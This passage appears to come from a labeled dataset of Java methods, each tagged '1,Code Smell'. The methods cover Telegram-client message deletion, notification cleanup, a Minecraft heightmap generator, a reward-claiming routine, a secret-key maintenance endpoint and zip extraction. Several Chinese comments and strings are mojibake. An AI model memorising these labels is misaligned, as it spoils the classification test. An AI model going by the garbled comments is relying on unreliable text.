    while (windowR <= M && arr[windowR] <= max) {
      windowR++;
    }
    while (windowL <= M && arr[windowL] < min) {
      windowL++;
    }
    ans+=windowR - windowL;
  }
  long[] help=new long[R - L + 1];
  int i=0;
  int p1=L;
  int p2=M + 1;
  while (p1 <= M && p2 <= R) {
    help[i++]=arr[p1] <= arr[p2] ? arr[p1++] : arr[p2++];
  }
  while (p1 <= M) {
    help[i++]=arr[p1++];
  }
  while (p2 <= R) {
    help[i++]=arr[p2++];
  }
  for (i=0; i < help.length; i++) {
    arr[L + i]=help[i];
  }
  return ans;
}",1,Code Smell
"public FlatHeightmapGenerator(@NonNull WorldServer world){
  super(world);
  FlatGeneratorInfo generatorInfo=this.loadGeneratorInfoFromWorld(world);
  List<FlatLayerInfo> layers=generatorInfo.getFlatLayers();
  int topOpaqueLayerIndex=-1;
  int topWaterLayerIndex=-1;
  IntList topTransparentLayers=new IntArrayList();
  for (int i=layers.size() - 1; i >= 0; i--) {
    FlatLayerInfo layer=layers.get(i);
    int blockType=blockType(layer.getLayerMaterial());
    if (topWaterLayerIndex < 0 && layer.getLayerMaterial().getBlock() == Blocks.WATER) {
      topWaterLayerIndex=i;
    }
 else     if (blockType == BLOCK_TYPE_OPAQUE) {
      topOpaqueLayerIndex=i;
      break;
    }
 else     if (blockType == BLOCK_TYPE_TRANSPARENT && topTransparentLayers.size() < EXTRA_LAYERS.length) {
      topTransparentLayers.add(i);
    }
  }
  if (topOpaqueLayerIndex >= 0) {
    this.datas[DEFAULT_LAYER]=this.toHeightmapData(generatorInfo,topOpaqueLayerIndex,DEFAULT_LAYER);
  }
  if (topWaterLayerIndex >= 0) {
    this.datas[WATER_LAYER]=this.toHeightmapData(generatorInfo,topWaterLayerIndex,WATER_LAYER);
  }
  for (int i=0; i < topTransparentLayers.size(); i++) {
    this.datas[EXTRA_LAYERS[i]]=this.toHeightmapData(generatorInfo,topTransparentLayers.getInt(i),DEFAULT_LAYER);
  }
}",1,Code Smell
"private static void consumeGoldIndex(){
  try {
    String s=ConsumeGoldRpcCall.consumeGoldIndex();
    JSONObject jo=new JSONObject(s);
    if (jo.getBoolean(""success"")) {
      JSONObject homePromoInfoDTO=jo.getJSONObject(""homePromoInfoDTO"");
      JSONArray homePromoTokenDTOList=homePromoInfoDTO.getJSONArray(""homePromoTokenDTOList"");
      int tokenLeftAmount=0;
      int tokenTotalAmount=0;
      for (int i=0; i < homePromoTokenDTOList.length(); i++) {
        jo=homePromoTokenDTOList.getJSONObject(i);
        String tokenType=jo.getString(""tokenType"");
        if (""CONSUME_GOLD"".equals(tokenType)) {
          tokenLeftAmount=jo.getInt(""tokenLeftAmount"");
        }
      }
      if (tokenLeftAmount > 0) {
        for (int j=0; j < tokenLeftAmount; j++) {
          jo=new JSONObject(ConsumeGoldRpcCall.promoTrigger());
          if (jo.getBoolean(""success"")) {
            JSONObject homePromoPrizeInfoDTO=jo.getJSONObject(""homePromoPrizeInfoDTO"");
            int quantity=homePromoPrizeInfoDTO.getInt(""quantity"");
            Log.other(""璧氭秷璐归噾馃挵[鎶�5甯佹娊]#"" + quantity);
            if (homePromoPrizeInfoDTO.has(""promoAdvertisementInfo"")) {
              JSONObject promoAdvertisementInfo=homePromoPrizeInfoDTO.getJSONObject(""promoAdvertisementInfo"");
              String outBizNo=promoAdvertisementInfo.getString(""outBizNo"");
              jo=new JSONObject(ConsumeGoldRpcCall.advertisement(outBizNo));
            }
          }
        }
      }
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""queryTreasureBox err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"/** 
 * 浠庣粰瀹氳捣濮嬩綅缃В鏋愪笅涓�涓獅@linkplain Expression}銆� <p> 濡傛灉娌℃湁锛屽皢杩斿洖 {@code null}銆� </p>
 * @param source
 * @param startIndex
 * @return
 */
protected Expression resolveNextExpression(String source,int startIndex){
  int length=source.length();
  for (int i=startIndex; i < length; ) {
    if (source.charAt(i) == this.escaper && matchAtIndex(source,i + 1,this.startIdentifier)) {
      i+=this.startIdentifier.length() + 1;
    }
 else     if (matchAtIndex(source,i,this.startIdentifier)) {
      StringBuilder content=new StringBuilder();
      int j=i + this.startIdentifier.length();
      while (j < length) {
        char cj=source.charAt(j);
        if (cj == this.escaper && matchAtIndex(source,j + 1,this.endIdentifier)) {
          content.append(this.endIdentifier);
          j+=this.endIdentifier.length() + 1;
        }
 else         if (matchAtIndex(source,j,this.endIdentifier)) {
          break;
        }
 else {
          content.append(cj);
          j+=1;
        }
      }
      if (j >= length || content.length() == 0) {
        i=j + 1;
        continue;
      }
 else {
        return newExpressionInstance(this.startIdentifier,this.endIdentifier,source.substring(i,j + 1),i,j + 1,content.toString().trim());
      }
    }
 else     i+=1;
  }
  return null;
}",1,Code Smell
"public void deleteChannelHistory(final long dialog_id,TLRPC.Chat chat,final int offset_id){
  final TLRPC.TL_messages_getHistory req=new TLRPC.TL_messages_getHistory();
  req.peer=getMessagesController().getInputPeer((int)dialog_id);
  if (req.peer == null) {
    return;
  }
  req.limit=100;
  req.offset_id=offset_id;
  final int currentReqId=++lastReqId;
  getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    if (error == null) {
      int lastMessageId=offset_id;
      if (currentReqId == lastReqId) {
        if (response != null) {
          TLRPC.messages_Messages res=(TLRPC.messages_Messages)response;
          int size=res.messages.size();
          if (size == 0) {
            return;
          }
          HashSet<Long> ids=new HashSet<>();
          ArrayList<Integer> msgIds=new ArrayList<>();
          ArrayList<Long> random_ids=new ArrayList<>();
          for (int a=0; a < res.messages.size(); a++) {
            TLRPC.Message message=res.messages.get(a);
            msgIds.add(message.id);
            if (message.from_id.user_id > 0) {
              ids.add(message.peer_id.user_id);
            }
 else {
              msgIds.add(message.id);
              if (message.random_id != 0) {
                random_ids.add(message.random_id);
              }
            }
            if (message.id > lastMessageId) {
              lastMessageId=message.id;
            }
          }
          for (          long userId : ids) {
            deleteUserChannelHistory(chat,userId,0);
          }
          if (!msgIds.isEmpty()) {
            getMessagesController().deleteMessages(msgIds,random_ids,null,dialog_id,true,false);
          }
          deleteChannelHistory(dialog_id,chat,lastMessageId);
        }
      }
    }
 else {
      AlertUtil.showToast(error.code + "": "" + error.text);
    }
  }
),ConnectionsManager.RequestFlagFailOnServerErrors);
}",1,Code Smell
"@Override public Flux<ChatResponse> stream(Prompt prompt){
  ChatCompletionRequest request=createRequest(prompt,true);
  Flux<StreamResponse> response=this.anthropicApi.chatCompletionStream(request);
  AtomicReference<ChatCompletionBuilder> chatCompletionReference=new AtomicReference<>();
  return response.map(chunk -> {
    if (chunk.type().equals(""message_start"")) {
      chatCompletionReference.set(new ChatCompletionBuilder());
      chatCompletionReference.get().withType(chunk.type()).withId(chunk.message().id()).withRole(chunk.message().role()).withModel(chunk.message().model()).withUsage(chunk.message().usage()).withContent(new ArrayList<>());
    }
 else     if (chunk.type().equals(""content_block_start"")) {
      var content=new MediaContent(chunk.contentBlock().type(),null,chunk.contentBlock().text(),chunk.index());
      chatCompletionReference.get().withType(chunk.type()).withContent(List.of(content));
    }
 else     if (chunk.type().equals(""content_block_delta"")) {
      var content=new MediaContent(Type.TEXT_DELTA,null,(String)chunk.delta().get(""text""),chunk.index());
      chatCompletionReference.get().withType(chunk.type()).withContent(List.of(content));
    }
 else     if (chunk.type().equals(""message_delta"")) {
      ChatCompletion delta=ModelOptionsUtils.mapToClass(chunk.delta(),ChatCompletion.class);
      chatCompletionReference.get().withType(chunk.type());
      if (delta.id() != null) {
        chatCompletionReference.get().withId(delta.id());
      }
      if (delta.role() != null) {
        chatCompletionReference.get().withRole(delta.role());
      }
      if (delta.model() != null) {
        chatCompletionReference.get().withModel(delta.model());
      }
      if (delta.usage() != null) {
        chatCompletionReference.get().withUsage(delta.usage());
      }
      if (delta.content() != null) {
        chatCompletionReference.get().withContent(delta.content());
      }
      if (delta.stopReason() != null) {
        chatCompletionReference.get().withStopReason(delta.stopReason());
      }
      if (delta.stopSequence() != null) {
        chatCompletionReference.get().withStopSequence(delta.stopSequence());
      }
    }
 else {
      chatCompletionReference.get().withType(chunk.type()).withContent(List.of());
    }
    return chatCompletionReference.get().build();
  }
).map(this::toChatResponse);
}
",1,Code Smell
"public void cleanup(){
  popupMessages.clear();
  popupReplyMessages.clear();
  channelGroupsCreated=false;
  notificationsQueue.postRunnable(() -> {
    openedDialogId=0;
    openedTopicId=0;
    total_unread_count=0;
    personalCount=0;
    pushMessages.clear();
    pushMessagesDict.clear();
    fcmRandomMessagesDict.clear();
    pushDialogs.clear();
    wearNotificationsIds.clear();
    lastWearNotifiedMessageId.clear();
    openedInBubbleDialogs.clear();
    delayedPushMessages.clear();
    notifyCheck=false;
    lastBadgeCount=0;
    try {
      if (notificationDelayWakelock.isHeld()) {
        notificationDelayWakelock.release();
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
    dismissNotification();
    setBadge(getTotalAllUnreadCount());
    SharedPreferences preferences=getAccountInstance().getNotificationsSettings();
    SharedPreferences.Editor editor=preferences.edit();
    editor.clear();
    editor.commit();
    if (Build.VERSION.SDK_INT >= 26) {
      try {
        systemNotificationManager.deleteNotificationChannelGroup(""channels"" + currentAccount);
        systemNotificationManager.deleteNotificationChannelGroup(""groups"" + currentAccount);
        systemNotificationManager.deleteNotificationChannelGroup(""private"" + currentAccount);
        systemNotificationManager.deleteNotificationChannelGroup(""stories"" + currentAccount);
        systemNotificationManager.deleteNotificationChannelGroup(""other"" + currentAccount);
        String keyStart=currentAccount + ""channel"";
        List<NotificationChannel> list=systemNotificationManager.getNotificationChannels();
        int count=list.size();
        for (int a=0; a < count; a++) {
          NotificationChannel channel=list.get(a);
          String id=channel.getId();
          if (id.startsWith(keyStart)) {
            try {
              systemNotificationManager.deleteNotificationChannel(id);
            }
 catch (            Exception e) {
              FileLog.e(e);
            }
            if (BuildVars.LOGS_ENABLED) {
              FileLog.d(""delete channel cleanup "" + id);
            }
          }
        }
      }
 catch (      Throwable e) {
        FileLog.e(e);
      }
      try {
        String keyGroup=currentAccount + ""group"";
        List<NotificationChannelGroup> list=systemNotificationManager.getNotificationChannelGroups();
        for (        NotificationChannelGroup group : list) {
          String id=group.getId();
          if (id.equals(keyGroup)) {
            systemNotificationManager.deleteNotificationChannelGroup(id);
          }
        }
      }
 catch (      Throwable e) {
        FileLog.e(e);
      }
    }
  }
);
}",1,Code Smell
"private boolean checkInstantButtonMotionEvent(MotionEvent event){
  if (!currentMessageObject.isSponsored() && (!drawInstantView || currentMessageObject.type == MessageObject.TYPE_TEXT)) {
    return false;
  }
  int x=(int)event.getX();
  int y=(int)event.getY();
  if (event.getAction() == MotionEvent.ACTION_DOWN) {
    if (drawInstantView && instantButtonRect.contains(x,y)) {
      selectorDrawableMaskType[0]=lastPoll != null ? 2 : 0;
      instantPressed=true;
      if (Build.VERSION.SDK_INT >= 21 && selectorDrawable[0] != null) {
        if (instantButtonRect.contains(x,y)) {
          selectorDrawable[0].setHotspot(x,y);
          selectorDrawable[0].setState(pressedState);
          setInstantButtonPressed(true);
        }
      }
      invalidate();
      return true;
    }
  }
 else   if (event.getAction() == MotionEvent.ACTION_UP) {
    if (instantPressed) {
      if (delegate != null) {
        if (lastPoll != null) {
          if (currentMessageObject.scheduled) {
            Toast.makeText(getContext(),LocaleController.getString(""MessageScheduledVoteResults"",R.string.MessageScheduledVoteResults),Toast.LENGTH_LONG).show();
          }
 else {
            if (pollVoted || pollClosed) {
              delegate.didPressInstantButton(this,drawInstantViewType);
            }
 else {
              if (!currentMessageObject.checkedVotes.isEmpty()) {
                pollVoteInProgressNum=-1;
                pollVoteInProgress=true;
                vibrateOnPollVote=true;
                voteCurrentProgressTime=0.0f;
                firstCircleLength=true;
                voteCurrentCircleLength=360;
                voteRisingCircleLength=false;
              }
              delegate.didPressVoteButtons(this,currentMessageObject.checkedVotes,-1,0,namesOffset);
            }
          }
        }
 else {
          delegate.didPressInstantButton(this,drawInstantViewType);
        }
      }
      playSoundEffect(SoundEffectConstants.CLICK);
      if (Build.VERSION.SDK_INT >= 21 && selectorDrawable[0] != null) {
        selectorDrawable[0].setState(StateSet.NOTHING);
      }
      setInstantButtonPressed(instantPressed=false);
      invalidate();
    }
  }
 else   if (event.getAction() == MotionEvent.ACTION_MOVE) {
    if (instantButtonPressed && Build.VERSION.SDK_INT >= 21 && selectorDrawable[0] != null) {
      selectorDrawable[0].setHotspot(x,y);
    }
  }
  return false;
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.diceStickersDidLoad) {
    String name=(String)args[0];
    if (INTERACTIONS_STICKER_PACK.equals(name)) {
      checkStickerPack();
    }
  }
 else   if (id == NotificationCenter.onEmojiInteractionsReceived) {
    if (NekoConfig.disableRemoteEmojiInteractions.Bool())     return;
    if (chatActivity == null) {
      return;
    }
    long dialogId=(long)args[0];
    TLRPC.TL_sendMessageEmojiInteraction action=(TLRPC.TL_sendMessageEmojiInteraction)args[1];
    if (dialogId == this.dialogId && supportedEmoji.contains(action.emoticon)) {
      int messageId=action.msg_id;
      if (action.interaction.data != null) {
        try {
          JSONObject jsonObject=new JSONObject(action.interaction.data);
          JSONArray array=jsonObject.getJSONArray(""a"");
          for (int i=0; i < array.length(); i++) {
            JSONObject actionObject=array.getJSONObject(i);
            int animation=actionObject.optInt(""i"",1) - 1;
            double time=actionObject.optDouble(""t"",0.0);
            AndroidUtilities.runOnUIThread(new Runnable(){
              @Override public void run(){
                findViewAndShowAnimation(messageId,animation);
              }
            }
,(long)(time * 1000));
          }
        }
 catch (        JSONException e) {
          e.printStackTrace();
        }
      }
    }
  }
 else   if (id == NotificationCenter.updateInterfaces) {
    Integer printingType=MessagesController.getInstance(currentAccount).getPrintingStringType(dialogId,threadMsgId);
    if (printingType != null && printingType == 5) {
      cancelHintRunnable();
    }
  }
}",1,Code Smell
"public static void setSerialDataZhenshiByShowContent(ZhenShiResponse911202002050 zhenShiResponse911202002050,ShowContent showContent,String validityPeriod) throws Exception {
  Map<String,TextPlay> textPlayList=showContent.getTextPlay();
  for (  Map.Entry<String,TextPlay> item : textPlayList.entrySet()) {
    TextPlay textPlay=null;
    if (!(item.getValue() instanceof TextPlay)) {
      textPlay=BeanUtils.deepMapToBean(TextPlay.class.newInstance().getClass(),(Map)item.getValue());
    }
 else {
      textPlay=item.getValue();
    }
    Integer serialChannel=0;
    if (!(textPlay.getSerialChannel() instanceof Integer)) {
      serialChannel=Integer.parseInt(textPlay.getSerialChannel() + """");
    }
    Integer row=1;
    row=new Integer(item.getKey());
    if (textPlay.getStatus() == 1 && StringUtils.isNotEmpty(textPlay.getValue())) {
      SeriaDataUtils.setSerialDataZhenshi(zhenShiResponse911202002050,textPlay.getValue(),serialChannel,row.byteValue(),textPlay.getColor(),textPlay.getInMode(),textPlay.getOutMode(),showContent.getDeviceModel(),""text"","""",validityPeriod);
    }
  }
  Map<Integer,VoicePlay> voicePlayList=showContent.getVoicePlay();
  for (  Map.Entry<Integer,VoicePlay> item : voicePlayList.entrySet()) {
    VoicePlay voicePlay=null;
    if (!(item.getValue() instanceof VoicePlay)) {
      voicePlay=BeanUtils.deepMapToBean(VoicePlay.class.newInstance().getClass(),(Map)item.getValue());
    }
 else {
      voicePlay=item.getValue();
    }
    Integer serialChannel=0;
    if (!(voicePlay.getSerialChannel() instanceof Integer)) {
      serialChannel=Integer.parseInt(voicePlay.getSerialChannel() + """");
    }
    Integer row=1;
    if (!(item.getKey() instanceof Integer)) {
      row=Integer.parseInt(item.getKey() + """");
    }
    if (voicePlay.getStatus() == 1 && StringUtils.isNotEmpty(voicePlay.getValue())) {
      SeriaDataUtils.setSerialDataZhenshi(zhenShiResponse911202002050,voicePlay.getValue(),serialChannel,row.byteValue(),"""","""","""",showContent.getDeviceModel(),""voice"",voicePlay.getPlayMode(),validityPeriod);
    }
  }
}",1,Code Smell
"void createHeadersTransition(){
  mHeadersTransition=TransitionHelper.loadTransition(FragmentUtil.getContext(BrowseFragment.this),mShowingHeaders ? R.transition.lb_browse_headers_in : R.transition.lb_browse_headers_out);
  TransitionHelper.addTransitionListener(mHeadersTransition,new TransitionListener(){
    @Override public void onTransitionStart(    Object transition){
    }
    @Override public void onTransitionEnd(    Object transition){
      mHeadersTransition=null;
      if (mMainFragmentAdapter != null) {
        mMainFragmentAdapter.onTransitionEnd();
        if (!mShowingHeaders && mMainFragment != null) {
          View mainFragmentView=mMainFragment.getView();
          if (mainFragmentView != null && !mainFragmentView.hasFocus()) {
            mainFragmentView.requestFocus();
          }
        }
      }
      if (mHeadersFragment != null) {
        mHeadersFragment.onTransitionEnd();
        if (mShowingHeaders) {
          VerticalGridView headerGridView=mHeadersFragment.getVerticalGridView();
          if (headerGridView != null && !headerGridView.hasFocus()) {
            headerGridView.requestFocus();
          }
        }
      }
      updateTitleViewVisibility();
      if (mBrowseTransitionListener != null) {
        mBrowseTransitionListener.onHeadersTransitionStop(mShowingHeaders);
      }
    }
  }
);
}
",1,Code Smell
"@SuppressWarnings(""unchecked"") Object setObjectRecursive(Object current,final List<String> paths,int index,final Object value){
  boolean isLastIndex=index == paths.size();
  if (isLastIndex) {
    return value;
  }
  String path=paths.get(index).trim();
  boolean isNeedMap=isPathMap(path);
  if (isNeedMap) {
    Map<String,Object> mapping;
    boolean isCurrentMap=current instanceof Map;
    if (!isCurrentMap) {
      mapping=new HashMap<String,Object>();
      mapping.put(path,buildObject(paths.subList(index + 1,paths.size()),value));
      return mapping;
    }
    mapping=((Map<String,Object>)current);
    boolean hasSameKey=mapping.containsKey(path);
    if (!hasSameKey) {
      mapping.put(path,buildObject(paths.subList(index + 1,paths.size()),value));
      return mapping;
    }
    current=mapping.get(path);
    mapping.put(path,setObjectRecursive(current,paths,index + 1,value));
    return mapping;
  }
  boolean isNeedList=isPathList(path);
  if (isNeedList) {
    List<Object> lists;
    int listIndexer=getIndex(path);
    boolean isCurrentList=current instanceof List;
    if (!isCurrentList) {
      lists=expand(new ArrayList<Object>(),listIndexer + 1);
      lists.set(listIndexer,buildObject(paths.subList(index + 1,paths.size()),value));
      return lists;
    }
    lists=(List<Object>)current;
    lists=expand(lists,listIndexer + 1);
    boolean hasSameIndex=lists.get(listIndexer) != null;
    if (!hasSameIndex) {
      lists.set(listIndexer,buildObject(paths.subList(index + 1,paths.size()),value));
      return lists;
    }
    current=lists.get(listIndexer);
    lists.set(listIndexer,setObjectRecursive(current,paths,index + 1,value));
    return lists;
  }
  throw BitSailException.asBitSailException(CommonErrorCode.RUNTIME_ERROR,""Unexpected exception"");
}",1,Code Smell
"private static int compareFirstNotNullMetricValue(BaseMetrics a1,BaseMetrics a2,List<String> metricNameList,Field defaultField){
  try {
    Float m1=null;
    Float m2=null;
    for (    String metric : metricNameList) {
      m1=a1.getMetric(metric);
      if (m1 != null) {
        break;
      }
    }
    for (    String metric : metricNameList) {
      m2=a2.getMetric(metric);
      if (m2 != null) {
        break;
      }
    }
    if (m1 != null && m2 == null) {
      return -1;
    }
 else     if (m1 == null && m2 != null) {
      return 1;
    }
 else     if (m1 != null && m2 != null) {
      int val=compareObject(m2,m1);
      if (val != 0) {
        return val;
      }
    }
    Object f1=FieldUtils.readField(a1,defaultField.getName(),true);
    Object f2=FieldUtils.readField(a2,defaultField.getName(),true);
    if (f1 != null && f2 != null) {
      return compareObject(f2,f1);
    }
    if (f1 != null) {
      return -1;
    }
 else     if (f2 != null) {
      return 1;
    }
    return 0;
  }
 catch (  Exception e) {
    log.debug(""method=sortMetricsObject||metricsA={}||metricsB={}||metricNameList={}||defaultFieldName={}||errMsg=exception."",a1,a2,metricNameList,defaultField.getName(),e);
  }
  return 0;
}",1,Code Smell
"private static File getPlistFromZip(File file,String unzipDirectory) throws Exception {
  InputStream input=null;
  OutputStream output=null;
  File result=null;
  File unzipFile=null;
  ZipFile zipFile=null;
  try {
    zipFile=new ZipFile(file);
    String name=file.getName().substring(0,file.getName().lastIndexOf("".""));
    unzipFile=new File(unzipDirectory + ""/"" + name);
    if (unzipFile.exists()) {
      unzipFile.delete();
    }
    unzipFile.mkdir();
    Enumeration<? extends ZipEntry> zipEnum=zipFile.entries();
    ZipEntry entry=null;
    String entryName=null;
    String[] names=null;
    int length;
    while (zipEnum.hasMoreElements()) {
      entry=zipEnum.nextElement();
      entryName=new String(entry.getName());
      names=entryName.split(""\\/"");
      length=names.length;
      for (int v=0; v < length; v++) {
        if (entryName.endsWith("".app/Info.plist"")) {
          input=zipFile.getInputStream(entry);
          result=new File(unzipFile.getAbsolutePath() + ""/Info.plist"");
          output=Files.newOutputStream(result.toPath());
          byte[] buffer=new byte[1024 * 8];
          int readLen=0;
          while ((readLen=input.read(buffer,0,1024 * 8)) != -1) {
            output.write(buffer,0,readLen);
          }
          break;
        }
      }
    }
  }
 catch (  Exception ex) {
    ex.printStackTrace();
  }
 finally {
    if (input != null) {
      input.close();
    }
    if (output != null) {
      output.flush();
      output.close();
    }
    if (zipFile != null) {
      zipFile.close();
    }
  }
  if (file.exists()) {
    file.delete();
  }
  return result;
}",1,Code Smell
"@PostMapping(""/maintain"") public ResponseEntity<?> maintain(@RequestParam(""secretKey"") String secretKey,@RequestParam(""openAll"") Boolean openAll,@RequestParam(value=""openList"",required=false) List<String> openList,@RequestParam(value=""closeList"",required=false) List<String> closeList){
  if (!configKey.equals(secretKey)) {
    throw new RuntimeException(""璁よ瘉澶辫触锛孾secretKey="" + secretKey + ""]涓嶉�氳繃"");
  }
  if (openAll) {
    maintainProperties.setGlobalInfo(new MaintainProperties.MaintainInfo(MaintainProperties.MaintainState.NORMAL));
  }
 else {
    maintainProperties.setGlobalInfo(new MaintainProperties.MaintainInfo(MaintainProperties.MaintainState.PAUSED));
  }
  if (openList != null) {
    for (    String serviceName : openList) {
      if (serviceName != null && !serviceName.isEmpty()) {
        maintainProperties.getServiceMaintainInfo().put(serviceName,new MaintainProperties.MaintainInfo(MaintainProperties.MaintainState.NORMAL));
      }
    }
  }
  if (closeList != null) {
    for (    String serviceName : closeList) {
      if (serviceName != null && !serviceName.isEmpty()) {
        maintainProperties.getServiceMaintainInfo().put(serviceName,new MaintainProperties.MaintainInfo(MaintainProperties.MaintainState.PAUSED));
      }
    }
  }
  return ResponseEntity.ok().build();
}
",1,Code Smell
"public static int[] rearrangeBarcodes(int[] barcodes){
  HashMap<Integer,Integer> hm=new HashMap<>();
  if (barcodes == null || barcodes.length == 0)   return new int[0];
  for (  int a : barcodes)   hm.put(a,hm.getOrDefault(a,0) + 1);
  PriorityQueue<Map.Entry<Integer,Integer>> pq=new PriorityQueue<Map.Entry<Integer,Integer>>((a,b) -> b.getValue() - a.getValue() == 0 ? a.getKey() - b.getKey() : b.getValue() - a.getValue());
  for (  Map.Entry<Integer,Integer> mentry : hm.entrySet())   pq.offer(mentry);
  int i=0;
  while (!pq.isEmpty()) {
    int k=2;
    List<Map.Entry> ls=new ArrayList<Map.Entry>();
    while (k > 0 && !pq.isEmpty()) {
      Map.Entry<Integer,Integer> mentry1=pq.poll();
      barcodes[i++]=mentry1.getKey();
      mentry1.setValue(mentry1.getValue() - 1);
      ls.add(mentry1);
      k--;
    }
    for (    Map.Entry<Integer,Integer> e : ls) {
      if (e.getValue() > 0)       pq.add(e);
    }
    if (pq.isEmpty())     break;
  }
  return barcodes;
}",1,Code Smell
"@OnMessage public void onMessage(String message,Session session){
  JSONObject jsonMsg=JSON.parseObject(message);
  if (jsonMsg.getString(""msg"").equals(""ping"")) {
    Session agentSession=BytesTool.agentSessionMap.get(jsonMsg.getInteger(""agentId""));
    if (agentSession != null) {
      JSONObject pong=new JSONObject();
      pong.put(""msg"",""pong"");
      BytesTool.sendText(agentSession,pong.toJSONString());
    }
    return;
  }
  log.info(""Session :{} send message: {}"",session.getId(),jsonMsg);
switch (jsonMsg.getString(""msg"")) {
case ""battery"":
{
      devicesService.refreshDevicesBattery(jsonMsg);
      break;
    }
case ""debugUser"":
  devicesService.updateDevicesUser(jsonMsg);
break;
case ""heartBeat"":
Agents agentsOnline=agentsService.findById(jsonMsg.getInteger(""agentId""));
if (agentsOnline.getStatus() != AgentStatus.ONLINE) {
agentsOnline.setStatus(AgentStatus.ONLINE);
agentsService.saveAgents(agentsOnline);
}
break;
case ""agentInfo"":
{
Session agentSession=BytesTool.agentSessionMap.get(jsonMsg.getInteger(""agentId""));
if (agentSession != null) {
try {
agentSession.close();
}
 catch (IOException e) {
e.printStackTrace();
}
BytesTool.agentSessionMap.remove(jsonMsg.getInteger(""agentId""));
}
BytesTool.agentSessionMap.put(jsonMsg.getInteger(""agentId""),session);
jsonMsg.remove(""msg"");
agentsService.saveAgents(jsonMsg);
}
break;
case ""subResultCount"":
resultsService.subResultCount(jsonMsg.getInteger(""rid""));
break;
case ""deviceDetail"":
devicesService.deviceStatus(jsonMsg);
break;
case ""step"":
case ""perform"":
case ""record"":
case ""status"":
resultDetailService.saveByTransport(jsonMsg);
break;
case ""findSteps"":
JSONObject steps=findSteps(jsonMsg,""runStep"");
Session agentSession=BytesTool.agentSessionMap.get(jsonMsg.getInteger(""agentId""));
if (agentSession != null) {
BytesTool.sendText(agentSession,steps.toJSONString());
}
break;
case ""errCall"":
agentsService.errCall(jsonMsg.getInteger(""agentId""),jsonMsg.getString(""udId""),jsonMsg.getInteger(""tem""),jsonMsg.getInteger(""type""));
break;
}
}
",1,Code Smell
"/** 
 * 鍐欑湅鏉胯剼鏈��
 * @param renderContext
 * @param dashboardMeta
 * @param dashboard
 * @param writeScriptTag
 * @throws IOException
 */
protected void writeDashboardScript(HtmlTplDashboardRenderContext renderContext,TplDashboardMeta dashboardMeta,HtmlTplDashboard dashboard,boolean writeScriptTag) throws IOException {
  String globalDashboardVar=dashboardMeta.getDashboardVar();
  if (StringUtil.isEmpty(globalDashboardVar))   globalDashboardVar=getDefaultDashboardVar();
  Writer out=renderContext.getWriter();
  String dashboardCode=dashboardMeta.getDashboardCode();
  boolean writeDashboardInit=false;
  boolean writeDashboardRender=false;
  if (DASHBOARD_CODE_ATTR_VALUE_INSTANCE.equalsIgnoreCase(dashboardCode)) {
    writeDashboardInit=false;
    writeDashboardRender=false;
  }
 else   if (DASHBOARD_CODE_ATTR_VALUE_INIT.equalsIgnoreCase(dashboardCode)) {
    writeDashboardInit=true;
    writeDashboardRender=false;
  }
 else   if (DASHBOARD_CODE_ATTR_VALUE_RENDER.equalsIgnoreCase(dashboardCode)) {
    writeDashboardInit=true;
    writeDashboardRender=true;
  }
 else {
    writeDashboardInit=true;
    writeDashboardRender=dashboardMeta.isDashboardAutoRender();
  }
  String tmp0RenderContextVarName=renderContext.varNameOfRenderContext(""Tmp0"");
  String tmp1RenderContextVarName=renderContext.varNameOfRenderContext(""Tmp1"");
  String localDashboardVarName=renderContext.varNameOfDashboard(""Tmp"");
  dashboard.setVarName(localDashboardVarName);
  dashboard.setLoadableChartWidgets(dashboardMeta.getLoadableChartWidgets());
  if (writeScriptTag)   writeScriptStartTag(out);
  writeNewLine(out);
  out.write(""(function("" + this.localGlobalVarName + ""){"");
  writeNewLine(out);
  writeDashboardJsVar(renderContext,dashboard,tmp0RenderContextVarName);
  writeChartScripts(renderContext,dashboard,dashboardMeta);
  writeDashboardJsInit(renderContext,dashboard,tmp1RenderContextVarName);
  writeDashboardJsFactoryInit(renderContext,dashboard,dashboardMeta.getDashboardFactoryVar());
  out.write(this.localGlobalVarName + ""."" + globalDashboardVar+ ""=""+ localDashboardVarName+ "";"");
  writeNewLine(out);
  if (writeDashboardInit)   writeDashboardJsInit(renderContext,dashboard);
  if (writeDashboardRender)   writeDashboardJsRender(renderContext,dashboard);
  out.write(""})(this);"");
  writeNewLine(out);
  if (writeScriptTag) {
    writeScriptEndTag(out);
    writeNewLine(out);
  }
}",1,Code Smell
"/** 
 * @param xpath 鐖剁骇鑺傜偣xpath
 * @return com.alibaba.fastjson.JSONArray
 * @author ZhouYiXun
 * @des 鑾峰彇瀛愯妭鐐逛俊鎭�
 * @date 2021/8/16 23:36
 */
public JSONArray getChildren(org.jsoup.select.Elements elements,String xpath){
  JSONArray elementList=new JSONArray();
  for (int i=0; i < elements.size(); i++) {
    JSONObject ele=new JSONObject();
    int tagCount=0;
    int siblingIndex=0;
    String indexXpath;
    for (int j=0; j < elements.size(); j++) {
      if (elements.get(j).attr(""class"").equals(elements.get(i).attr(""class""))) {
        tagCount++;
      }
      if (i == j) {
        siblingIndex=tagCount;
      }
    }
    if (tagCount == 1) {
      indexXpath=xpath + ""/"" + elements.get(i).attr(""class"");
    }
 else {
      indexXpath=xpath + ""/"" + elements.get(i).attr(""class"")+ ""[""+ siblingIndex+ ""]"";
    }
    ele.put(""id"",xpathId);
    xpathId++;
    ele.put(""label"",""<"" + elements.get(i).attr(""class"") + "">"");
    JSONObject detail=new JSONObject();
    detail.put(""xpath"",indexXpath);
    for (    Attribute attr : elements.get(i).attributes()) {
      if (attr.getKey().equals(""bounds"")) {
        String bounds=attr.getValue().replace(""]["","":"");
        String pointStart=bounds.substring(1,bounds.indexOf("":""));
        String pointEnd=bounds.substring(bounds.indexOf("":"") + 1,bounds.indexOf(""]""));
        detail.put(""bStart"",pointStart);
        detail.put(""bEnd"",pointEnd);
      }
      detail.put(attr.getKey(),attr.getValue());
    }
    ele.put(""detail"",detail);
    if (elements.get(i).children().size() > 0) {
      ele.put(""children"",getChildren(elements.get(i).children(),indexXpath));
    }
    elementList.add(ele);
  }
  return elementList;
}",1,Code Smell
"@Override public boolean initOnce() throws Exception {
  Class<?> kRFWLayerAnimPart=Initiator.load(""com.tencent.richframework.gallery.part.RFWLayerAnimPart"");
  if (kRFWLayerAnimPart != null) {
